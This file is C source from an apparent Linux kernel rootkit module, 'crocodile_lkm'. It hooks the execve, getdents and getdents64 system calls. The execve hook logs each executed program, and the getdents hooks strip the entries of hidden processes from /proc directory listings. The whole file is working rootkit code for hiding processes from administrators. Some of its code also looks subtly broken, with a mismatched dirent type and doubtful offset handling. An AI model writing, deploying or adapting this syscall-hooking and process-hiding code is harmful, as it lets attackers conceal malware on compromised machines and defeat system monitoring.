/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>
#include <linux/syscalls.h>

#include "logging.h"
#include "ctrl/ctrl.h"
#include "systbl/details/dirent_hack.h"
#include "systbl/details/hacked_funcs.h"
#include "systbl/details/syscall_utils.h"

asmlinkage long hacked_execve(const struct pt_regs* p_regs)
{
    int exec_res;
    char __user* filename = (char*)p_regs->di;
    char kfilename[NAME_MAX] = {0};
    sys_call_fn_t orig_execve = NULL;

    if (strncpy_from_user(kfilename, filename, NAME_MAX) > 0) {
        KLOG_INFO("executable file is '%s'\n", kfilename);
    }

    orig_execve = orig_syscall(__NR_execve);
    exec_res = orig_execve(p_regs);
    /*
     * #define current get_current()
     * static inline struct task_struct * get_current(void) - return context of current task.
     */
    KLOG_INFO("execve '%s' process\n", current->comm);
    return exec_res;
}

asmlinkage long hacked_getdents(const struct pt_regs* p_regs)
{
    struct linux_dirent* p_dirent = (struct linux_dirent*)p_regs->si;
    int ret = orig_syscall(__NR_getdents)(p_regs);
	int off = 0;
	struct linux_dirent* p_dir;
	struct linux_dirent* p_kdirent;
	struct linux_dirent* p_prev = NULL;
	struct inode* p_inode;

    if (ret < 1) {
		return ret;
	}

	p_inode = current->files->fdt->fd[/*fd*/(int)p_regs->di]->f_path.dentry->d_inode;
	if ((p_inode->i_ino != PROC_ROOT_INO) || MAJOR(p_inode->i_rdev)) {
		return ret;
	}

	p_kdirent = kzalloc(ret, GFP_KERNEL);
	if (p_kdirent == NULL) {
		return ret;
	}

	if (copy_from_user(p_kdirent, p_dirent, ret) != 0) {
		kfree(p_kdirent);
		return ret;
	}

	while (off < ret) {
		p_dir = (void*)p_kdirent + off;
		if (is_process_hidden(simple_strtoul(p_dir->d_name, NULL, 10))) {
			if (p_dir == p_kdirent) {
				ret -= p_dir->d_reclen;
				memmove(p_dir, (void *)p_dir + p_dir->d_reclen, ret);
			} else {
			    p_prev->d_reclen += p_dir->d_reclen;
			}
		} else {
			p_prev = p_dir;
		}
		off += p_dir->d_reclen;
	}
	if (copy_to_user(p_dirent, p_kdirent, ret) != 0) {
		kfree(p_kdirent);
		return ret;
	}
	kfree(p_kdirent);
	return ret;
}

asmlinkage long hacked_getdents64(const struct pt_regs* p_regs)
{
	struct linux_dirent* p_dirent = (struct linux_dirent*)p_regs->si;
	//sys_call_fn_t orig_getdents64 = ;
	int ret = orig_syscall(__NR_getdents64)(p_regs);
	int off = 0;
	struct linux_dirent64* p_dir;
	struct linux_dirent64* p_kdirent;
	struct linux_dirent64* p_prev = NULL;
	struct inode* p_inode;

    if (ret < 1) {
		return ret;
	}

	p_inode = current->files->fdt->fd[/*fd*/(int)p_regs->di]->f_path.dentry->d_inode;
	if ((p_inode->i_ino != PROC_ROOT_INO) || MAJOR(p_inode->i_rdev)) {
		return ret;
	}

	p_kdirent = kzalloc(ret, GFP_KERNEL);
	if (p_kdirent == NULL) {
		return ret;
	}

	if (copy_from_user(p_kdirent, p_dirent, ret) != 0) {
		kfree(p_kdirent);
		return ret;
	}

	while (off < ret) {
		p_dir = (void*)p_kdirent + off;
		//p_dir = (void*)p_dirent + off;
		if (is_process_hidden(simple_strtoul(p_dir->d_name, NULL, 10))) {
			if (p_dir == p_kdirent) {
			//if (p_dir == p_dirent) {
				ret -= p_dir->d_reclen;
				memmove(p_dir, (void *)p_dir + p_dir->d_reclen, ret);
			} else {
			    p_prev->d_reclen += p_dir->d_reclen;
			}
		} else {
			p_prev = p_dir;
		}
		off += p_dir->d_reclen;
	}
	if (copy_to_user(p_dirent, p_kdirent, ret) != 0) {
		kfree(p_kdirent);
		return ret;
	}
	kfree(p_kdirent);
	return ret;
}

